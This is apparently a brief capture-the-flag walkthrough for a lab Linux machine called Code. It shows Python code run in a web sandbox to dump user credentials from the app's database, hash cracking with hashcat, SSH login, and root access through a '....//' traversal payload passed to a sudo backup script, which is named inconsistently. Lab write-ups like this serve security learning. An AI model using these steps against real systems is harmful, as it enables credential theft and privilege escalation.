# Code Easy Linux Machine

Start by finding a website like a python editor to code in your browser >> since the code is being executed in the server you can just try to scape or execute commands that were not suppose to be executed.

Like trying to get database credentials since the website has some kinda of login system.

```python
print("Hello World from sandbox!");

# Trying to access session variable for the database which might be running in the server.
usernames = [u.usernames for u in db.session.query(User).all()]

passwords = [u.passwords for u in db.session.query(User).all()]

# Print all
print(usernames, passwords)
```

It will return two usernames and two md5 hashes.

Next step is cracking the hashes using hashcat and then login using ssh in the martin user.

There is no flag for this user just the bucky.sh which you can run as root.

To get the user flag you can change `task.json` from `/home/app-production/app` to `/home/app-production` and that will give you user.txt

Now to get root you need to just escape a regex filter by inserting dots and slashes two times since they are removed only once.

Change the targeted directory in the task.json to: `....//....//....//root/` and then run the script with sudo :D

```bash
sudo /usr/bin/backy.sh task.json
```

